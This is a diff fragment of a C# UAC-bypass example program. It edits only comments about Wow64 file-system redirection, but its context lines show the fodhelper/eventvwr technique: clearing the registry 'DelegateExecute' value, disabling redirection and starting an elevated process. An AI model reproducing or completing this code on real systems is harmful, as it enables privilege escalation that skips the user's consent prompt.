@@ -61,9 +61,10 @@ namespace UACBypassExample
                   if (isWin10up)
                         Registry.SetValue(upath[1].RegPath, "DelegateExecute", "");
                   
-		          // use this if your program is running on 32 bit.
+		          // use this if your program is running on 32 bit accessing 64 bit system files.
 		          // it is used to prevent redirection to SysWOW64 when trying to access something
-                  // on System32, since both fodhelper and eventvwr doesn't even exists there somehow.
+                  // on System32 especially if your OS is 64 bit, since both fodhelper and eventvwr
+				  // doesn't even exists there (SysWOW64) somehow.
                   if (Imports.Wow64DisableWow64FsRedirection(out ov))
                   {
                         Process.Start(new ProcessStartInfo()
